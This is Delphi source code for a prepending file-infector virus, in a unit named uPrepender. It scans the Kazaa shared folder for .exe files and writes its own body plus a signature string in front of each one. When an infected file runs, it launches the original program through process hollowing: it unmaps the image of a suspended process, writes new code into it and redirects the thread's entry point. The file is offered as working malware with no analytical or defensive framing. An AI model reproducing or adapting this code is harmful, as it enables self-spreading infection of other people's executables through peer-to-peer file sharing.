   UNIT uPrepender;

   INTERFACE

   USES
     Windows, ACLUtils;

   PROCEDURE Init;
   PROCEDURE DropFile;
   PROCEDURE InfectKazaaDir;
   FUNCTION  KazaaDir : STRING;
   FUNCTION  ZwUnmapViewOfSection(ProcessHandle:THandle;BaseAddress:Pointer) : DWORD; STDCALL; EXTERNAL 'ntdll.dll'

   IMPLEMENTATION

   VAR
     VX                    : FILE;
     VirusEndSignature     : STRING;
     CommandLineParameters : STRING;
     VirusSize             : Longint;
     VirusPositon          : Longint;
     VirusBuffer           : AnsiString;

   TYPE
     TSections = ARRAY [0..0] OF TImageSectionHeader;

     TProcInfo = PACKED RECORD
       BaseAddr  : DWORD;
       ImageSize : DWORD;
     END;

     FixUpBlock = PACKED RECORD
       PageRVA   : Longint;
       BlockSize : Longint;
     END;

   // Check whether the OS is Windows NT based or not.
   FUNCTION IsNTBasedOS : BOOL;
   VAR
     verInfo : TOSVersionInfo;
   BEGIN
     verInfo.dwOSVersionInfoSize:=SizeOf(TOSVersionInfo);
     GetVersionEx(verInfo);
     IF verInfo.dwPlatformId=VER_PLATFORM_WIN32_NT THEN Result:=True ELSE Result:=False;
   END;

   // This function calculates the aligned size of a section.
   FUNCTION GetAlignedSize(Size:DWORD;Alignment:DWORD) : DWORD;
   BEGIN
     IF ((Size MOD Alignment)=0) THEN Result:=Size ELSE Result:=((Size DIV Alignment)+1)*Alignment;
   END;

   // This  function calculates  the size required to load an EXE  into memory with
   // proper alignment.
   FUNCTION ImageSize(Image:Pointer) : DWORD;
   VAR
     Alignment      : DWORD;
     SectionLoop    : DWORD;
     PSections      :^TSections;
     ImageNtHeaders : PImageNtHeaders;
   BEGIN
     Result:=0;
     ImageNtHeaders:=Pointer(DWORD(Image)+DWORD(PImageDosHeader(Image)._lfanew));
     Alignment:=ImageNtHeaders.OptionalHeader.SectionAlignment;
     IF((ImageNtHeaders.OptionalHeader.SizeOfHeaders MOD Alignment)=0) THEN Result:=ImageNtHeaders.OptionalHeader.SizeOfHeaders else Result := ((ImageNtHeaders.OptionalHeader.SizeOfHeaders DIV Alignment)+1)*Alignment;
     PSections:=Pointer(pChar(@(ImageNtHeaders.OptionalHeader))+ImageNtHeaders.FileHeader.SizeOfOptionalHeader);
     FOR SectionLoop:=0 TO ImageNtHeaders.FileHeader.NumberOfSections-1 DO BEGIN
       IF PSections[SectionLoop].Misc.VirtualSize<>0 THEN BEGIN
           IF((PSections[SectionLoop].Misc.VirtualSize MOD Alignment)=0) THEN Result:=Result+PSections[SectionLoop].Misc.VirtualSize
             ELSE Result:=Result+(((PSections[SectionLoop].Misc.VirtualSize DIV Alignment)+1)*Alignment);
       END;
     END;
   END;

   FUNCTION CreateProcessEx(FileMemory:Pointer) : BOOL;
   VAR
     Data           : DWORD;
     HeaderSize     : DWORD;
     InjectSize     : DWORD;
     SectionLoop    : DWORD;
     SectionSize    : DWORD;
     CurAddr        : DWORD;
     V              : Pointer;
     FileData       : Pointer;
     InjectMemory   : Pointer;
     OldProtect     : Cardinal;
     Context        : TContext;
     ProcInfo2      : TProcInfo;
     PSections      :^TSections;
     StartInfo      : TStartupInfo;
     ImageNtHeaders : PImageNtHeaders;
     ProcInfo       : TProcessInformation;
     MemInfo        : MEMORY_BASIC_INFORMATION;
   BEGIN
     Result:=False;
     ImageNtHeaders:=Pointer(DWORD(FileMemory)+DWORD(PImageDosHeader(FileMemory)._lfanew));
     InjectSize:=ImageSize(FileMemory);
     InjectMemory:=VirtualAlloc(NIL,InjectSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
     TRY
       FileData:=InjectMemory;
       HeaderSize:=ImageNtHeaders.OptionalHeader.SizeOfHeaders;
       PSections:=Pointer(pChar(@(ImageNtHeaders.OptionalHeader))+ImageNtHeaders.FileHeader.SizeOfOptionalHeader);
       // certain  PE files have sectionHeaderSize  value > size of PE file itself.
       // this loop handles this situation  by find the section that is  nearest to
       // the PE header.
       FOR SectionLoop:=0 TO ImageNtHeaders.FileHeader.NumberOfSections-1 DO IF PSections[SectionLoop].PointerToRawData<HeaderSize THEN HeaderSize:=PSections[SectionLoop].PointerToRawData;
       // read the PE header
       CopyMemory(FileData,FileMemory,HeaderSize);
       FileData:=Pointer(DWORD(FileData)+GetAlignedSize(ImageNtHeaders.OptionalHeader.SizeOfHeaders,ImageNtHeaders.OptionalHeader.SectionAlignment));
       // read the sections
       FOR SectionLoop:=0 TO ImageNtHeaders.FileHeader.NumberOfSections-1 DO BEGIN
         IF PSections[SectionLoop].SizeOfRawData>0 THEN BEGIN
           SectionSize:=PSections[SectionLoop].SizeOfRawData;
           IF SectionSize>PSections[SectionLoop].Misc.VirtualSize THEN SectionSize:=PSections[SectionLoop].Misc.VirtualSize;
           CopyMemory(FileData,Pointer(DWORD(FileMemory)+PSections[SectionLoop].PointerToRawData),SectionSize);
           FileData:=Pointer(DWORD(FileData)+GetAlignedSize(PSections[SectionLoop].Misc.VirtualSize,ImageNtHeaders.OptionalHeader.SectionAlignment));
         END ELSE
         // This handles the case where the PE file has an empty section. E.g. UPX0
         // section in UPXed files.
         IF PSections[SectionLoop].Misc.VirtualSize<>0 THEN FileData:=Pointer(DWORD(FileData)+GetAlignedSize(PSections[SectionLoop].Misc.VirtualSize,ImageNtHeaders.OptionalHeader.SectionAlignment));
       END;
       ZeroMemory(@StartInfo,SizeOf(StartupInfo));
       ZeroMemory(@Context,SizeOf(TContext));
       // Creates the  original  EXE in suspended mode  and returns its info in the
       // PROCINFO structure.
       IF CreateProcess(nil,pChar(CommandLineParameters),NIL,NIL,False,CREATE_SUSPENDED,NIL,NIL,StartInfo,ProcInfo) THEN BEGIN
         Context.ContextFlags:=CONTEXT_FULL;
         GetThreadContext(ProcInfo.hThread,Context);
         ReadProcessMemory(ProcInfo.hProcess,Pointer(Context.Ebx+8),@ProcInfo2.BaseAddr,SizeOf(DWORD),Data);
         CurAddr:=procinfo2.BaseAddr;
         WHILE (VirtualQueryEx(ProcInfo.hProcess,Pointer(curAddr),MemInfo,SizeOf(MemInfo))<>0) DO BEGIN
           IF MemInfo.State=MEM_FREE THEN Break;
           CurAddr:=CurAddr+MemInfo.RegionSize;
         END;
         ProcInfo2.ImageSize:=DWORD(CurAddr) - DWORD(procinfo2.BaseAddr);
         // if new EXE has same baseaddr and is its size is <= to the original EXE,
         // just overwrite it in memory
         V:=NIL;
         IF(Injectsize<=ProcInfo2.ImageSize)AND(ImageNtHeaders.OptionalHeader.ImageBase=ProcInfo2.BaseAddr) THEN BEGIN
           V:=Pointer(ProcInfo2.baseAddr);
           VirtualProtectEx(ProcInfo.hProcess,Pointer(ProcInfo2.BaseAddr),ProcInfo2.ImageSize,PAGE_EXECUTE_READWRITE,@OldProtect);
         END ELSE BEGIN
           // try to unmap the original EXE image
           IF (ZwUnmapViewOfSection(Procinfo.hProcess,Pointer(ProcInfo2.baseAddr)))=0 THEN BEGIN
             // allocate memory for the new EXE image at the prefered imagebase.
             V:=VirtualAllocEx(ProcInfo.hProcess,Pointer(ImageNtHeaders.OptionalHeader.ImageBase),InjectSize,MEM_RESERVE OR MEM_COMMIT,PAGE_EXECUTE_READWRITE);
           END;
         END;
         IF (Cardinal(V)>0)THEN BEGIN
           // patch the EXE base addr in PEB (PEB + 8 holds process base addr)
           WriteProcessMemory(ProcInfo.hProcess,Pointer(Context.Ebx+8),@V,SizeOf(DWORD),Data);
           IF WriteProcessMemory(ProcInfo.hProcess,V,InjectMemory,InjectSize,Data) THEN BEGIN
             Context.ContextFlags:=CONTEXT_FULL;
             IF DWORD(V)=Procinfo2.BaseAddr THEN Context.Eax:=DWORD(ImageNtHeaders.OptionalHeader.ImageBase)+ImageNtHeaders.OptionalHeader.AddressOfEntryPoint
               ELSE Context.Eax:=DWORD(V)+ImageNtHeaders.OptionalHeader.AddressOfEntryPoint;
             SetThreadContext(ProcInfo.hThread,Context);
             IF ResumeThread(ProcInfo.hThread)<>-1 THEN Result:=True;
           END ELSE TerminateProcess(ProcInfo.hProcess,0);
         END;
       END;
     FINALLY
     END;
   END;

   FUNCTION KazaaDir : STRING;
   BEGIN
     Result:='c:\progrmfiles\kazaa\my shared folder\';
   END;

   FUNCTION TempPath : STRING;
   BEGIN
     SetLength(Result,MAX_PATH);
     GetTempPath(MAX_PATH,@Result[1]);
   END;

   PROCEDURE Prepend(DestinationFileName:STRING);
   VAR
     DestinationFile     : FILE;
     FileAttribute       : Integer;
     DestinationFileSize : Longint;
     Buf                 : AnsiString;
   BEGIN
     TRY
       FileAttribute:=GetFileAttributes(pAnsiChar(DestinationFileName));
       SetFileAttributes(pAnsiChar(DestinationFileName), 80);
       {$I-}
       AssignFile(DestinationFile,DestinationFileName);
       FileMode:=2;
       Reset(DestinationFile,1);
       DestinationFileSize:=FileSize(DestinationFile);
       SetLength(Buf,DestinationFileSize);
       BlockRead(DestinationFile,Buf[1],DestinationFileSize);
       IF Pos(VirusEndSignature,Buf)=0 THEN BEGIN
         Seek(DestinationFile,0);
         BlockWrite(DestinationFile,VirusBuffer[1],VirusSize);
         BlockWrite(DestinationFile,VirusEndSignature[1],Length(VirusEndSignature));
         BlockWrite(DestinationFile,Buf[1],DestinationFileSize);
         CloseFile(DestinationFile);
       END;
       {$I+}
       SetFileAttributes(pAnsiChar(DestinationFileName), FileAttribute);
     FINALLY
     END;

   END;

   PROCEDURE DropFile;
   VAR
     G : FILE;
     S : STRING;
     T : Longint;
   BEGIN
    {$I-}
     T:=VirusPositon+Length(VirusEndSignature);
     IF VirusPositon>0 THEN BEGIN
       // Working as  a classic prepender  if can not  execute the original file in
       // the memory.
       IF(NOT IsNTBasedOS)OR(NOT CreateProcessEx(@VirusBuffer[T])) THEN BEGIN
         TRY
           S:=TempPath+ExtractFileName(ParamStr(0));
           AssignFile(G,S);
           Rewrite(G,1);
           BlockWrite(G,VirusBuffer[T],Length(VirusBuffer)-T+1);
           CloseFile(G);
           WinExec(pChar(S+' '+CommandLineParameters),SW_SHOW);
          EXCEPT
          END;
        END;
     END;
     {$I+}
   END;

   // Search for all .exe files in Kazaa shared directory.
   PROCEDURE InfectKazaaDir;
   VAR
     Error : Integer;
     D     : TSearchRec;
   BEGIN
     Error:=FindFirst(KazaaDir+'*.exe',faAnyFile OR faHidden,D);
     WHILE Error=0 DO BEGIN
       Prepend(KazaaDir+D.Name);
       Error:=FindNext(D);
     END;
   END;

   PROCEDURE Init;
   VAR
     I : Byte;
   BEGIN
     // Format original command line parameters
     CommandLineParameters:='"'+ParamStr(0)+'"';
     IF ParamCount>0 THEN FOR I:=1 TO ParamCount DO CommandLineParameters:=CommandLineParameters+' '+ParamStr(I);
     // '8IKLM' is a virus signature. It  is important to use  at least one  UPCASE
     // character in it!
     VirusEndSignature:=LowerCase('8IKLM');
     AssignFile(VX,ParamStr(0));
     FileMode:=0;
     Reset(VX,1);
     SetLength(VirusBuffer,FileSize(VX));
     BlockRead(VX,VirusBuffer[1],FileSize(VX));
     VirusPositon:=Pos(VirusEndSignature,VirusBuffer);
     IF VirusPositon=0 THEN VirusSize:=FileSize(VX) ELSE VirusSize:=VirusPositon-1;
     CloseFile(VX);
   END;


   END.
